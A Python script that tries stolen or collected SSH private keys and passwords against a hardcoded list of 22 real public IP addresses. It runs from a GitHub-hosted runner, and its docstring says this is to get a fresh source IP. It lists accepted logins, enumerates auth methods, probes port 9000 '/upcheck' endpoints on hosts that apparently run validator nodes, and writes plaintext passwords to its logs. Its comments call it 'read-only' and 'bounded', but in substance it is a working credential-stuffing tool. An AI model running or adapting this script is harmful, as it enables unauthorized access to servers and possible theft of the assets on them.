#!/usr/bin/env python3
"""Read-only SSH auth probe from a GitHub-hosted runner.
Replaces our usual egress with a fresh GitHub cloud IP.
Only: TCP connect, banner read, auth_none method enumeration, bounded auth
(publickey + password). No writes on targets, no keys changed on server.
"""
import os, sys, json, socket, base64, gzip, tarfile, io, time, tempfile
from concurrent.futures import ThreadPoolExecutor, as_completed

ACL8 = ["198.244.203.87","198.244.253.242","198.244.253.243","35.195.69.111",
        "35.241.236.239","57.128.187.18","57.128.187.3","51.68.54.178"]
BANNER22 = ["35.187.38.19","35.195.69.111","35.241.236.239","51.15.140.214",
            "51.68.54.178","51.158.75.24","51.159.83.150","51.159.173.108",
            "57.128.187.3","57.128.187.18","57.129.136.98","91.134.22.4",
            "141.94.3.9","141.94.28.196","162.19.43.13","172.241.49.19",
            "163.172.144.174","198.244.203.87","198.244.253.243","198.244.253.242",
            "212.47.249.248","217.182.89.170"]

def log(*a):
    print(*a, flush=True)

def tcp_banner(host, port=22, t=6.0):
    s = None
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=t)
        s.settimeout(4.0)
        data = b""
        try:
            data = s.recv(256)
        except socket.timeout:
            data = b""
        except Exception:
            data = b""
        ms = int((time.time()-t0)*1000)
        banner = data.decode("latin1", "replace").strip().replace("\r"," ").replace("\n"," ")
        return ("open", banner, ms, s)
    except socket.timeout:
        return ("timeout", "", int((time.time()-t0)*1000), None)
    except ConnectionRefusedError:
        return ("refused", "", int((time.time()-t0)*1000), None)
    except Exception as e:
        return ("err:"+type(e).__name__, str(e)[:60], int((time.time()-t0)*1000), None)

def load_keys():
    b64 = os.environ.get("KEYS_TGZ_B64","").strip()
    d = tempfile.mkdtemp(prefix="keys_")
    import subprocess
    raw = base64.b64decode(b64)
    with tarfile.open(fileobj=io.BytesIO(raw), mode="r:gz") as tf:
        tf.extractall(d)
    files = sorted(os.listdir(d))
    import paramiko
    out=[]
    for f in files:
        p=os.path.join(d,f)
        try:
            k=paramiko.PKey.from_path(p) if hasattr(paramiko.PKey,'from_path') else None
        except Exception:
            k=None
        if k is None:
            try:
                for cls in (paramiko.Ed25519Key,paramiko.ECDSAKey,paramiko.RSAKey):
                    try:
                        k=cls.from_private_key_file(p); break
                    except Exception: continue
            except Exception:
                k=None
        if k is not None:
            out.append((f,p,k))
    return out

def auth_host(host, keys, pws, is_acl, budget):
    import paramiko
    users = ["root","ubuntu","deploy"]
    if is_acl:
        users += ["kiln","ops","eth"]
    res={"host":host,"acl":is_acl,"tcp":None}
    stt, banner, ms, sock = tcp_banner(host,22)
    res["tcp"]=stt; res["banner"]=banner; res["tcp_ms"]=ms
    log(f"R|host={host}|stage=tcp|res={stt}|ms={ms}|banner={banner}")
    if stt!="open":
        if sock: sock.close()
        return res
    if sock:
        try: sock.close()
        except Exception: pass
    res["auth"]=[]
    # methods enumeration (auth_none)
    try:
        tr=paramiko.Transport((host,22))
        tr.banner_timeout=10; tr.auth_timeout=10
        tr.start_client(timeout=10)
        try:
            tr.auth_none("root")
            methods=["none"]
        except paramiko.BadAuthenticationType as e:
            methods=list(e.allowed_types)
        except Exception as e:
            methods=["err:"+type(e).__name__]
        res["methods"]=methods
        log(f"R|host={host}|stage=methods|res={','.join(methods)}")
        tr.close()
    except Exception as e:
        res["methods"]=["connect_err:"+type(e).__name__]
        log(f"R|host={host}|stage=methods|res=connect_err:{type(e).__name__}")
        return res
    # bounded auth per user
    nkeys=4 if not is_acl else 4
    npw=2
    for u in users:
        if budget["auth"]>=budget["auth_cap"]: break
        # one transport per (host,user); try keys then pw
        attempts=[]
        try:
            tr=paramiko.Transport((host,22))
            tr.banner_timeout=10; tr.auth_timeout=10
            tr.start_client(timeout=10)
        except Exception as e:
            res["auth"].append({"user":u,"err":"connect:"+type(e).__name__}); continue
        authenticated=False
        for (fname,fp,k) in keys[:nkeys]:
            if budget["auth"]>=budget["auth_cap"]: break
            budget["auth"]+=1
            try:
                tr.auth_publickey(u,k)
                attempts.append({"user":u,"key":fname,"res":"accepted"})
                log(f"R|host={host}|user={u}|key={fname}|res=accepted")
                authenticated=True; break
            except paramiko.BadAuthenticationType as e:
                attempts.append({"user":u,"key":fname,"res":"badtype"})
                log(f"R|host={host}|user={u}|key={fname}|res=badtype|methods={','.join(e.allowed_types)}")
                break
            except paramiko.AuthenticationException as e:
                attempts.append({"user":u,"key":fname,"res":"denied"})
                log(f"R|host={host}|user={u}|key={fname}|res=denied")
            except Exception as e:
                attempts.append({"user":u,"key":fname,"res":"err:"+type(e).__name__})
                log(f"R|host={host}|user={u}|key={fname}|res=err:{type(e).__name__}")
                break
        if not authenticated:
            for pw in pws[:npw]:
                if budget["auth"]>=budget["auth_cap"]: break
                budget["auth"]+=1
                try:
                    tr.auth_password(u,pw)
                    attempts.append({"user":u,"pw":pw,"res":"accepted"})
                    log(f"R|host={host}|user={u}|pw={pw}|res=accepted")
                    authenticated=True; break
                except paramiko.BadAuthenticationType as e:
                    attempts.append({"user":u,"pw":pw,"res":"badtype"})
                    log(f"R|host={host}|user={u}|pw={pw}|res=badtype")
                    break
                except paramiko.AuthenticationException:
                    attempts.append({"user":u,"pw":pw,"res":"denied"})
                    log(f"R|host={host}|user={u}|pw={pw}|res=denied")
                except Exception as e:
                    attempts.append({"user":u,"pw":pw,"res":"err:"+type(e).__name__})
                    log(f"R|host={host}|user={u}|pw={pw}|res=err:{type(e).__name__}")
                    break
        try: tr.close()
        except Exception: pass
        res["auth"].append({"user":u,"attempts":attempts,"accepted":authenticated})
        if authenticated and res.get("accepted_user") is None:
            res["accepted_user"]=u
    return res

def main():
    log("EGRESS_IP_BEGIN")
    try:
        import urllib.request
        log(urllib.request.urlopen("https://ifconfig.me/ip",timeout=10).read().decode().strip())
    except Exception as e:
        log("egress_err:"+str(e)[:80])
    log("EGRESS_IP_END")
    keys=load_keys()
    log(f"KEYS_LOADED={len(keys)}")
    pws=[p for p in os.environ.get("PW_LIST","").strip().split("\n") if p]
    log(f"PW_COUNT={len(pws)}")
    results=[]
    budget={"auth":0,"auth_cap":750,"conn":0,"conn_cap":120}
    with ThreadPoolExecutor(max_workers=4) as ex:
        futs={ex.submit(auth_host,h,keys,pws,(h in ACL8),budget):h for h in BANNER22}
        for fu in as_completed(futs):
            h=futs[fu]
            try:
                results.append(fu.result())
            except Exception as e:
                log(f"R|host={h}|stage=fatal|res={type(e).__name__}:{str(e)[:80]}")
                results.append({"host":h,"fatal":str(e)[:120]})
    # read-only beacon / upcheck spot (<=1 per host for the 8 ACL + a few)
    import urllib.request
    for h in ACL8:
        for port,path in ((9000,"/upcheck"),):
            try:
                u=f"http://{h}:{port}{path}"
                r=urllib.request.urlopen(u,timeout=5)
                body=r.read(200).decode("latin1","replace")
                log(f"R|host={h}|http={port}{path}|code={r.status}|body={body[:120]}")
            except Exception as e:
                log(f"R|host={h}|http={port}{path}|err={type(e).__name__}")
    summary={"egress_section":"above","keys":len(keys),"pw":len(pws),
             "auth_attempts":budget["auth"],"hosts":len(results),
             "accepted":[r["host"] for r in results if r.get("accepted_user")],
             "open22":[r["host"] for r in results if r.get("tcp")=="open"]}
    log("SUMMARY_JSON="+json.dumps(summary))

if __name__=="__main__":
    main()
